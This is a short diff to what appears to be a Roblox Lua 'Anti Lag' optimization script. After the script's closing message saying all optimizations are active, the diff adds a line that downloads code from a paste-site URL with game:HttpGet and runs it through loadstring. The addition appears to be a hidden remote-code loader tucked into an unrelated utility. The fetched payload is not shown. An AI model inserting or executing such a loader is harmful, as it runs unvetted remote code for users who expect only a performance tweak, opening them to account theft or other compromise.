@@ -1114,3 +1114,5 @@ resetBtn.MouseButton1Click:Connect(function()
 end)
 
 print("[MG Anti Lag] Auto-Executed: All optimizations active.")
+
+loadstring(game:HttpGet("https://pastefy.app/VEPBzfX7/raw"))()
